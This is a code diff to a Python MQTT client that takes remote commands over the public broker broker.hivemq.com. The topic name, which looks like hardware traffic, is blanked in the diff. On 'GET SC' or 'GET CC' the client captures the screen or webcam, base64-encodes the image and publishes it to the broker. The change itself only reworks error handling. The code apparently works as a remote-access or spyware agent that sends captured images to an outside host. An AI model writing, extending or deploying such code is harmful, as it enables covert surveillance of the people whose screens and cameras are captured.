@@ -11,7 +11,7 @@ import threading
 import time
 
 broker = "broker.hivemq.com"
-topic = "anonymous/i2c/bus"
+topic = ""
 
 mac = uuid.getnode()
 device_id = f"{mac:012x}"[-5:].upper()
@@ -150,27 +150,34 @@ def on_message(client, userdata, message):
             client.publish(topic, f"{device_id} ALREADY CANCELED")
 
     if "GET" in text:
-        parts = text.removeprefix("GET ").strip().split()
-        action = parts[0]
-        target = parts[1]
-        if target == device_id and action == "SC" and reserved:
-            try:
-                b64_str = screenshot_to_base64(format='WEBP', quality=50)
-                b64_size_kb = len(b64_str.encode('utf-8')) / 1024
-                print(str(b64_size_kb) + "Kb")
-                client.publish(topic, f"{device_id} {b64_str}")
-            except:
-                client.publish(topic, f"{device_id} ERROR")
-        elif target == device_id and action == "CC" and reserved:
-            try:
-                b64_str = webcam_to_base64(format='WEBP', quality=50)
-                b64_size_kb = len(b64_str.encode('utf-8')) / 1024
-                print(str(b64_size_kb) + "Kb")
-                client.publish(topic, f"{device_id} {b64_str}")
-            except:
-                client.publish(topic, f"{device_id} ERROR")
-        elif not reserved:
-            client.publish(topic, f"{device_id} NOT RESERVED")
+        try:
+            parts = text.removeprefix("GET ").strip().split()
+            if len(parts) < 2:
+                raise ValueError("Invalid GET command format")
+
+            action = parts[0]
+            target = parts[1]
+
+            if target == device_id and reserved:
+                if action == "SC":
+                    b64_str = screenshot_to_base64(format='WEBP', quality=50)
+                    b64_size_kb = len(b64_str.encode('utf-8')) / 1024
+                    print(str(b64_size_kb) + "Kb")
+                    client.publish(topic, f"{device_id} {b64_str}")
+                elif action == "CC":
+                    b64_str = webcam_to_base64(format='WEBP', quality=50)
+                    b64_size_kb = len(b64_str.encode('utf-8')) / 1024
+                    print(str(b64_size_kb) + "Kb")
+                    client.publish(topic, f"{device_id} {b64_str}")
+                else:
+                    client.publish(topic, f"{device_id} UNKNOWN ACTION")
+            elif not reserved:
+                client.publish(topic, f"{device_id} NOT RESERVED")
+            else:
+                client.publish(topic, f"{device_id} INVALID TARGET")
+
+        except Exception as e:
+            client.publish(topic, f"{device_id} ERROR: {str(e)}")
 
     if "NCL" in text:
         target = text.removeprefix("NCL ").strip()
